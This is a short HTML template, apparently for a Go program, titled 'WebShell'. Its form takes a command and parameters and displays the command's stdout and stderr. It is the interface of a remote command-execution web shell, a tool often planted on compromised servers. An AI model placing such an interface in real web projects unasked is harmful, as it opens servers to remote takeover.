<html>
<head>
<meta content="text/html; charset=utf-8">
<title>WebShell</title>
</head>

<body>

<form method="post" accept-charset="utf-8">
	Command: <input type="text" name="command" width="40%" value="{{.Command}}">
	Params : <input type="text" name="params" width="80%" value="{{.Params}}">
	<input type="submit" value="submit">
</form>
<pre>
{{.Stderr}}
{{.Stdout}}
</pre>
</body>
</html>
